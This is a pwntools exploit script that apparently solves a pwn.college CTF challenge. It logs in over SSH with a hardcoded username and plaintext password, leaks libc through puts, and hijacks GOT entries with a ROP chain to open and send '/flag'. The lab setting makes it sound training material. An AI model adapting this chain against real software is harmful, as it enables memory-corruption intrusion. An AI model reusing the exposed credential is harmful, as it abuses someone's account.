from pwn import *

e = ELF('./babyrop_level5_testing1')
libc = ELF('../../libc6_2.31-0ubuntu9.2_amd64.so')
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",keyfile='../../csec',port=22,password='djaxod12')

p = s.run('/babyrop_level5_testing1')

rdi = 0x0000000000401a5e
rsi = 0x0000000000401a76
rdx = 0x0000000000401a46
rcx = 0x0000000000401a4f

pay = b'A' * 0x88

pay += p64(rdi) + p64(e.got['read']) + p64(e.plt['puts'])
pay += p64(rdi) + p64(0) + p64(rsi) + p64(e.bss()+0x100) + p64(rdx) + p64(8) + p64(e.plt['read'])
pay += p64(rdi) + p64(0) + p64(rsi) + p64(e.got['puts']) + p64(rdx) + p64(8) + p64(e.plt['read'])
pay += p64(rdi) + p64(e.bss() + 0x100) + p64(rsi) + p64(0) + p64(e.plt['puts'])
pay += p64(rdi) + p64(0) + p64(rsi) + p64(e.got['puts']) + p64(rdx) + p64(8) + p64(e.plt['read'])
pay += p64(rdi) + p64(1) + p64(rsi) + p64(3) + p64(rdx) + p64(0) + p64(rcx) + p64(100) + p64(e.plt['puts'])

p.sendafter(b'\n\n',pay)

p.recvuntil(b'Exiting!\n')
read = u64(p.recvline().strip() + b'\x00\x00')
base = read - libc.symbols['read']
libc.address = base

sleep(1)
p.send(b'/flag')
p.send(p64(libc.symbols['open']))
p.send(p64(libc.symbols['sendfile']))

p.interactive()